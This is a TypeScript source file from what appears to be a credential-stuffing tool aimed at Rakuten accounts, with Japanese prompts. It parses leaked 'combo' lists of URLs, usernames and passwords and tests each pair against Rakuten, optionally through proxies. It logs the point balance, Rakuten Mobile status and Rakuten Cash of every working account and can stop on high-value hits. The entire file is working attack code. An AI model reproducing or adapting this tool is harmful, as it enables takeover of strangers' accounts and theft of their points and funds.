import { inputManager } from "../inputManager";
import { EnoguLike, LoggerLike, config } from "../types";
import { loggerMessage } from "./../loggerMessage/index";
import { wait } from "./../utils/wait";
import fs from "node:fs";
import { StandRakutenRouter } from "./StandRakutenRouter";

export class ComboRakutenRouter {
  constructor(
    private logger: LoggerLike,
    private enogu: EnoguLike,
    private loggerMessages: loggerMessage,
    private config: config,
  ) {}

  async start(withProxy: boolean, proxyContent: string[]) {
    this.logger.info({}, "Combo楽天垢 ポイントチェック");
    this.logger.info({}, "Crtl + C で終了");
    this.loggerMessages.blank();

    this.loggerMessages.showComboOptions();
    this.loggerMessages.blank();

    const option = (await new inputManager("Option: ").waitInput()).trim();

    if (option !== "1" && option !== "2") {
      return;
    }

    let comboFilePath = "";
    let resultFilePath = "";

    if (option === "1") {
      comboFilePath = (
        await new inputManager(
          "Comboファイルのパスを入力してください: ",
        ).waitInput()
      ).trim();

      resultFilePath = await new inputManager(
        "結果の出力パスを入力してください: ",
      ).waitInput();
    } else {
      comboFilePath = (
        await new inputManager(
          "Comboファイルのパスを入力してください: ",
        ).waitInput()
      ).trim();

      const fileName = comboFilePath.substring(
        comboFilePath.lastIndexOf("/") + 1,
      );
      const filePathWithoutFileName = comboFilePath.substring(
        0,
        comboFilePath.lastIndexOf("/"),
      );

      resultFilePath = `${filePathWithoutFileName}/${fileName}_result_${Date.now()}.txt`;
    }

    const cacheFilePath = resultFilePath + ".cache";

    this.loggerMessages.blank();

    let alreadyChecked: string[] = [];

    if (fs.existsSync(cacheFilePath)) {
      alreadyChecked.push(...fs
        .readFileSync(cacheFilePath, { encoding: "utf-8" })
        .split("\n")
        .map((data) => data.trim()));
      this.logger.info(
        {},
        `${cacheFilePath} に既にチェック済みのComboがあるため復元しました。`,
      );
    } else {
      this.logger.info(
        {},
        `${cacheFilePath} が見つからないため、新しいファイルを作成します。`,
      );
      fs.writeFileSync(cacheFilePath, "");
    }

    if (/^\S+$/.test(resultFilePath)) {
      if (!fs.existsSync(resultFilePath)) {
        fs.writeFileSync(resultFilePath, "");
        this.logger.info(
          {},
          `ファイルが存在しなかった為、${resultFilePath} が新規作成されました。`,
        );
      } else {
        alreadyChecked.push(...fs
          .readFileSync(resultFilePath, { encoding: "utf-8" })
          .split("\n")
          .map((data) => data.trim().split(":")[0]));
        this.logger.info(
          {},
          `${resultFilePath} に既にチェック済みのComboがあるため復元しました。`,
        );
      }
    } else {
      this.logger.error({}, "正しいファイルパスを入力してください");
      return;
    }

    const filter = {
      point: {
        use: false,
        value: 1
      },
      rakutenMobile: {
        use: false,
        value: true
      },
      rakutenCash: {
        use: false,
        value: 1
      },
      use: false
    }

    this.loggerMessages.blank();

    const useFilter = (await new inputManager(
      "Filterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
    ).waitInput()).toUpperCase();

    if (useFilter === "Y") {
      filter.use = true;
    }else {
      filter.use = false;
      this.logger.info({}, "Filterは使用されません");
    }

    if (filter.use) {
      this.loggerMessages.blank();
      this.loggerMessages.blank();

      const usePoint = (await new inputManager(
        "PointのFilterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
      ).waitInput()).toUpperCase();

      if (usePoint === "Y") {
        filter.point.use = true;
        const _value = parseInt(await new inputManager(
          "PointのFilter値を入力してください (X以上) : ",
        ).waitInput());

        if (!isNaN(_value)) {
          filter.point.value = _value;
        }else {
          this.logger.info({}, "入力値が不正なため、" + filter.point.value + "以上に設定されました。");
        }
      }else {
        filter.point.use = false;
        this.logger.info({}, "PointのFilterは使用されません");
      }

      this.loggerMessages.blank();

      const useRakutenMobile = (await new inputManager(
        "Rakuten MobileのFilterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
      ).waitInput()).toUpperCase();

      if (useRakutenMobile === "Y") {
        filter.rakutenMobile.use = true;
      }else {
        filter.rakutenMobile.use = false;
        this.logger.info({}, "Rakuten MobileのFilterは使用されません");
      }

      this.loggerMessages.blank();

      const useRakutenCash = (await new inputManager(
        "Rakuten CashのFilterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
      ).waitInput()).toUpperCase();

      if (useRakutenCash === "Y") {
        filter.rakutenCash.use = true;
        const _value = parseInt(await new inputManager(
          "Rakuten CashのFilter値を入力してください (X以上) : ",
        ).waitInput());

        if (!isNaN(_value)) {
          filter.rakutenCash.value = _value;
        }else {
          this.logger.info({}, "入力値が不正なため、" + filter.rakutenCash.value + "以上に設定されました。");
        }
      }else {
        filter.rakutenCash.use = false;
        this.logger.info({}, "Rakuten CashのFilterは使用されません");
      }
    }
    
    if (/^\S+$/.test(comboFilePath) && fs.existsSync(comboFilePath)) {
      const content = fs
        .readFileSync(comboFilePath, { encoding: "utf-8" })
        .split("\n");
      const comboResult: {
        username: string;
        password: string;
      }[] = [];

      if (content.length > 10000) {
        this.logger.warn(
          {},
          "ファイルが大きすぎる為、処理に時間がかかる可能性が有ります。",
        );
      }

      this.logger.info({}, `${content.length}件のComboを解析中・・・`);

      for (let i = 0, len = content.length; i < len; i++) {
        const splitLine = content[i]
          .replace("://", "_split_web_")
          .trim()
          .replace(/\s/g, ":")
          .split(":");
        const url = splitLine[0];
        if (!url.includes("rakuten") || splitLine.length < 3) {
          this.logger.warn({}, `(${i + 1}/${len}) ${splitLine.join(":")} 形式が違うComboがスキップされました。`);
          continue;
        }

        splitLine.shift();
        const username = splitLine[0].trim();
        splitLine.shift();
        const password = splitLine.join(":").trim();

        if (password.length < 8) {
          this.logger.warn({}, `(${i + 1}/${len}) ${splitLine.join(":")} 形式が違うComboがスキップされました。`);
          continue;
        }

        comboResult.push({
          username,
          password,
        });
      }

      for (let i = 0, len = comboResult.length; i < len; i++) {
        if (alreadyChecked.includes(comboResult[i].username)) {
          this.logger.info(
            {},
            `(${i + 1}/${len}) ${comboResult[i].username} は既に解析済みの為スキップされました。`,
          );
          continue;
        }

        this.logger.info(
          {},
          `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析中・・・`,
        );

        const result = await new StandRakutenRouter(
          this.logger,
          this.enogu,
          this.loggerMessages,
          this.config,
        ).check(
          comboResult[i].username,
          comboResult[i].password,
          withProxy,
          proxyContent,
        );

        alreadyChecked.push(comboResult[i].username);

        fs.appendFileSync(cacheFilePath, `${comboResult[i].username}\n`);

        try {
          JSON.parse(result.message);

          if (!result.success) {
            continue;
          }
        } catch (_e) {
          continue;
        }

        this.logger.info(
          {},
          `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
        );

        const info = `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}:${JSON.parse(
          result.message,
        )
          .some.map((some) => `${some.value}`)
          .join(":")}`.replace(/\n/gm, "")

        if (filter.use) {
          const point = JSON.parse(result.message).point;
          const rakutenMobile = JSON.parse(result.message).some.find(file => file.name === "Rakuten Mobile").value === 'Mobile会員' ?? false;
          const rakutenCash = JSON.parse(result.message).some.find(file => file.name === "楽天キャッシュ").value ?? 0;

          if ((filter.point.use && parseInt(point) > filter.point.value) || (filter.rakutenMobile.use && rakutenMobile === filter.rakutenMobile.value) || (filter.rakutenCash.use && parseInt(rakutenCash) > filter.rakutenCash.value)) {
            this.logger.info(
              {},
              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} がフィルターによりヒットしました。`,
            );

            this.logger.info(
              {},
              `情報: ${info}`,
            )

            await (
              new inputManager(`${this.enogu.green("[Wait] 完了したら Enter を押してください。: ")} `).waitInput()
            )
          }
        }

        fs.appendFileSync(
          resultFilePath,
          `${info}\n`,
        );

        await wait(this.config.values.waitTime / 3);
      }
    } else {
      this.logger.error({}, "正しいファイルパスを入力してください");
      return;
    }
  }
}
